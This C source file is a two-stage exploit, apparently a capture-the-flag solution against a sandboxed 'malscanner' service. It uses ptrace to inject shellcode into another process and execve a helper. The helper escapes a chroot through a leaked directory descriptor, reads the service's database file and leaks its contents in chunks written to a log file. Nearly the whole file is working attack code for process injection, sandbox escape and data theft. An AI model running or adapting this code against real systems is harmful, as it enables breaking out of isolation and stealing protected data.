#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/syscall.h>

void do_stage_1();
void do_stage_2();
void log_data(char* data, unsigned long size);
void inject();
void guard();
//https://github.com/earthquake/chw00t/blob/1fd1016eb957264ca45fe091c4c7e68e352fd65f/chw00t.c#L199
void putdata(pid_t child, unsigned long long addr, char* str, int len) {
char *laddr;
int i, j;
union u {
long val;
char chars[sizeof(int)];
} data;
i = 0;
j = len / sizeof(int);
laddr = str;
while(i < j) {
memcpy(data.chars, laddr, sizeof(int));
if (ptrace(PTRACE_POKEDATA, child,
(void*)addr + i * sizeof(int), data.val) != 0) {
printf("Error poking - %d\n", errno);
return;
};
++i;
laddr += sizeof(int);
}
j = len % sizeof(int);
if(j != 0) {
memcpy(data.chars, laddr, j);
ptrace(PTRACE_POKEDATA, child,
(void*)addr + i * sizeof(int), data.val);
}
}
void do_stage_1() {
const int pid = 3;
printf("Child is %d\n", getpid());
// Stage 1 consists of locating the parent process, attaching to it, and injectingcode
if (ptrace(PTRACE_ATTACH, pid, 0, 0) != 0) {
perror("Attaching");
return;
}
// Wait for process to stop
wait(NULL);
printf("[*] Attached\n");
// Retrieve the registers - we need RIP in order to know where to overwrite code
struct user_regs_struct regs;
if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) != 0) {
perror("Get regs");
return;
}
printf("[*] Got regs\n");
// 'guard' is a dummy symbol located at the end of our 'inject' function, to allow us
// to write the correct amount of code in
putdata(pid, regs.rip, (char*)inject, (int)(&guard - &inject));
printf("[*] Wrote data\n");
// Leave the process to run our code
if (ptrace(PTRACE_DETACH, pid, 0, 0) != 0) {
perror("Detach");
return;
}
puts("[*] Detached!");
sleep(5);
}
void do_stage_2() {
puts("Stage 2 - currently running in killer");
const int fd = 3;
// Save our location so we can switch back to it
int cwd = open(".", O_RDONLY|O_DIRECTORY);
int status;
// Use the dangling FD to leave chroot
status = fchdir(fd);
if (status != 0) {
printf("fchdir() = %d\n", errno);
return;
}
status = chdir("../../../../../../../../../../");
if (status != 0) {
printf("chdir() = %d\n", errno);
return;
}
// chroot capability was dropped, but that's ok - we can access paths relative tothe real root
// The only limitation is that due to binaries being linked against libraries withabsolute paths,
// we cannot execute any subprograms, other than those with the correct librariesalready copied in.
int file_fd = open("./var/www/malscanner/malscanner.db", O_RDONLY);
char* buf = calloc(1, 200000);
unsigned long size = read(file_fd, buf, 200000);
close(file_fd);
fchdir(cwd);
log_data(buf, size);
}
void inject() {
// Setup an execve call
char program[] = "/userprog";
char* arg[3] = {program, "2", 0};
// Hand-write the system call execve("/userprog", ["/userprog", "2", NULL], NULL]);
asm("movq $59, %%rax; movq %0, %%rdi; movq %1, %%rsi; xor %%rdx,%%rdx; syscall;"
:
:"r"(program), "r"(arg)
: "rax", "rdi", "rsi", "rdx");
}
void guard() {}
int main(int argc, char** argv) {
	if (argc < 2) { do_stage_1(); }
	else { do_stage_2(); }
}
void log_data(char* data, unsigned long size) {
int fd = open("log", O_WRONLY|O_APPEND, 0777);
lseek(fd, 0, SEEK_END);
int offset = 0;
char buf[8*8] = {0};
while (offset < size) {
	// Mark that this is our syscalls with a very distinct number
	((unsigned long*)buf)[0] = 0x1337;
	memcpy(&buf[7*8], &data[offset], 8);
	write(fd, buf, sizeof(buf));
	offset += 8;
}
close(fd);
}
